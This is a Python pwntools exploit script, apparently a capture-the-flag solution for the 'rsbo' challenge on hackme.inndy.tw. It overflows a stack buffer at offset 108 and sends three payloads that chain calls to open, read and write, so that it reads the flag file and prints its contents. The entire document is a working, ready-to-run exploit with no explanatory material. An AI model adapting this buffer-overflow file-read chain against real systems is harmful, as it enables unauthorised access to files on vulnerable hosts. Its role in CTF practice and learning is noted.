#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

elf = ELF("./rsbo")
open_addr = elf.symbols["open"]
write_addr = elf.symbols["write"]
read_addr = elf.symbols["read"]
#  flag_addr = elf.search("/home/rsbo/flag").next()
flag_addr = 0x080487D0
bss_addr = elf.bss()
start_addr = elf.symbols["_start"]

#  io = process("./rsbo")
io = remote("hackme.inndy.tw", 7706)

payload = fit({108: [p32(open_addr), p32(start_addr), p32(flag_addr), p32(0)]}, filler = "\x00")
#open("/home/rsbo/flag", 0) -> start
io.send(payload)

payload = fit({108: [p32(read_addr), p32(start_addr), p32(3), p32(bss_addr), p32(0x60)]}, filler = "\x00")
#read(3, bss_addr, 60) -> start
io.send(payload)

payload = fit({108: [p32(write_addr), p32(0xdeadbeef), p32(1), p32(bss_addr), p32(0x60)]}, filler = "\x00")
#write(1, bss_addr, 60) -> 0xdeadbeef
io.send(payload)

print io.recv()
io.close()
